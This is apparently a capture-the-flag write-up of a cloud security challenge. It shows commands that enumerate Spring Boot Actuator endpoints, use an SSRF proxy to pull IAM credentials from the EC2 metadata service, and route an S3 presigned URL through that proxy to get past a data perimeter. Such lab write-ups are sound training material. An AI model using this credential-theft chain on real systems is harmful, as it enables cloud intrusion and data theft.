

# 🎯 CTF Journal: Perimeter Leak Challenge – Wiz Cloud Security Champions

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/certificate-june%202025-1.png?raw=true" alt="Wiz Certificate - June 2025" width="700"/>
</p>


## 📋 Challenge Context

The Wiz “Perimeter Leak” challenge puts us in a realistic scenario: we have access to a jump server and need to extract a flag from an S3 bucket protected by an **AWS data perimeter**. This network protection blocks direct external access, a tough security mechanism! 🛡️

**💭 Scott Piper quote:**
*"AWS data perimeters are a very strong security mitigation, but I wanted to show a way in which things can go wrong using an important feature of AWS that is common in larger applications, but that many do not have experience with."*

---

## 🔍 Phase 1: Initial Reconnaissance

### Discovering the Spring Boot Actuator app

```bash
printenv | grep -i aws
```

**Result:** `INFO_MSG=You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com`

**💡 Why this command?**
Looking for AWS environment variables to understand the context. Spring Boot Actuator often exposes sensitive info via its endpoints.

### First contact with the app

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
```

**Result:** `Welcome to the proxy server` 🎯

**💡 Reasoning:**
Basic auth (`ctf:88sPVWyC2P3p`) works and reveals it’s a proxy server — key info for what’s next!

---

## 🕵️ Phase 2: Enumerating Actuator endpoints

```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/actuator" | jq
```

**📝 Endpoints discovered:**

* `/actuator/env` ➡️ **Environment variables (jackpot!)**
* `/actuator/mappings` ➡️ **Available routes**
* `/actuator/info`, `/actuator/health`, `/actuator/metrics`…

**💡 Strategy:**
In cloud CTFs, `/actuator/env` often leaks AWS secrets; `/actuator/mappings` shows app features.

---

## 🎯 Phase 3: Extracting the bucket name

```bash
curl -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator/env | jq
```

**Discovery:** Bucket name `challenge01-470f711` 🎉

**Direct test:**

```bash
aws s3 ls s3://challenge01-470f711 --no-sign-request
```

**Result:** Nothing… 😔 Bucket exists but denies anonymous requests.

---

## 🔓 Phase 4: Finding the SSRF vulnerability

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings
```

**💥 Eureka!** Mappings reveal a `/proxy` endpoint allowing requests to other URLs — our **Server-Side Request Forgery (SSRF)**!

**💡 Why is this critical?**
SSRF + AWS = potential access to EC2 metadata at `169.254.169.254`, the magic IP with temporary credentials.

---

## 🔑 Phase 5: Using SSRF to steal credentials

### Step 1: Get the session token

```bash
curl -u ctf:88sPVWyC2P3p -X PUT "https://challenge01.cloud-champions.com/proxy" \
  -d "url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -i
```

**Token received:** `AQAEAEbB-QdrWKMm50g1uaRph7UAewtHhUuFJQ7hhKAM7FelzTKukQ==`

**💡 Explanation:**
AWS IMDSv2 requires a session token to secure metadata access.

### Step 2: Discover IAM role name

```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: AQAEAEbB-QdrWKMm50g1uaRph7UAewtHhUuFJQ7hhKAM7FelzTKukQ=="
```

**Role found:** `challenge01-5592368`

### Step 3: Extract AWS credentials

```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" \
  -H "X-aws-ec2-metadata-token: AQAEAEbB-QdrWKMm50g1uaRph7UAewtHhUuFJQ7hhKAM7FelzTKukQ=="
```

**🎉 Credentials obtained:**

* `AccessKeyId`: `ASIAxxxxxxxx`
* `SecretAccessKey`: `6XbC/+2OiIxxxxx`
* `SessionToken`: `IQoJb3JpZ2luX2VjEPT...`

---

## ⚙️ Phase 6: Configure AWS environment

```bash
export AWS_ACCESS_KEY_ID="AccessKeyId"
export AWS_SECRET_ACCESS_KEY="SecretAccessKey"
export AWS_SESSION_TOKEN="SessionToken"

aws sts get-caller-identity
```

**✅ Confirmation:** Authenticated as the right role!

---

## 📁 Phase 7: Explore the S3 bucket

```bash
aws s3 ls s3://challenge01-470f711/
```

**Content discovered:**

* `private/` (folder)
* `hello.txt` (file)

```bash
aws s3 ls s3://challenge01-470f711/private/
```

**File found:** `flag.txt` 🎯

**Direct access attempt:**

```bash
aws s3 cp s3://challenge01-470f711/private/flag.txt .
```

**❌ Error 403 Forbidden** — Data perimeter blocks access!

---

## 🧠 Phase 8: Understanding the problem & strategy

### 🔍 Data Perimeter dilemma

**Problem:** We have valid IAM credentials, but the S3 bucket enforces a **network condition** via a VPC Endpoint. AWS CLI requests exit to the public internet, so are blocked.

**SSRF solution:** The SSRF proxy only allows requests to domains containing `amazonaws.com` — perfect! 🎯

### 💡 Strategy: Presigned URLs

**Idea:** Generate a **presigned URL** that embeds access rights in the URL itself, then use SSRF proxy to access it inside the allowed network perimeter.

---

## 🚀 Phase 9: Final exploitation

### Generate presigned URL

```bash
aws s3 presign s3://challenge01-470f711/private/flag.txt --region us-east-1 --expires-in 700
```

### Retrieve flag via SSRF

```bash
curl -G --user ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy" \
  --data-urlencode "url=<PRESIGNED_URL>"
```

**💡 Why `curl -G` and `--data-urlencode`?**

* `-G` forces GET with encoded query parameters
* `--data-urlencode` safely encodes special characters (&, =, %) in presigned URL
* `--user` handles Basic auth cleanly

---

## 🏆 Victory!

**🎉 FLAG OBTAINED!**

---

## 📚 Lessons learned

**🔐 AWS Security:** AWS Data Perimeters are strong, but presigned URLs can bypass them if not carefully handled.

**🕳️ SSRF + Cloud = Danger:** SSRF in cloud environments is especially risky as it exposes sensitive metadata.

**🛠️ Technical:** Proper URL encoding is critical when passing complex parameters via proxies.

**💭 Scott Piper quote:**
*"AWS data perimeters are a very strong security mitigation, but I wanted to show a way in which things can go wrong using an important feature of AWS that is common in larger applications, but that many do not have experience with."*

A brilliant challenge highlighting the subtle nuances of cloud security! 🌟

---


## 💬 Let’s Connect!  
Thank you for visiting my GitHub! 🌸  

Here, I share my **Cloud Security projects** and **AWS learning journey**.  
Looking for **Cloud Computing Security** articles? Check out my **Medium**!  

<p align="center">
  <a href="https://www.linkedin.com/in/kenza-in-the-cloud/" target="_blank">
    <img src="https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>
  <a href="https://discord.com/users/kzax01" target="_blank">
    <img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
  </a>
  <a href="https://medium.com/@Kenza.In.The.Cloud" target="_blank">
    <img src="https://img.shields.io/badge/Medium-12100E?style=for-the-badge&logo=medium&logoColor=white" alt="Medium">
  </a>
</p>


### ☁️ Let’s build the future of cloud together!  
<p align="center">
  <img src="https://i.pinimg.com/originals/91/1d/91/911d914aaf6194489a3f5626bed2bd3a.gif" width="600" alt="Cool GIF">
</p> 
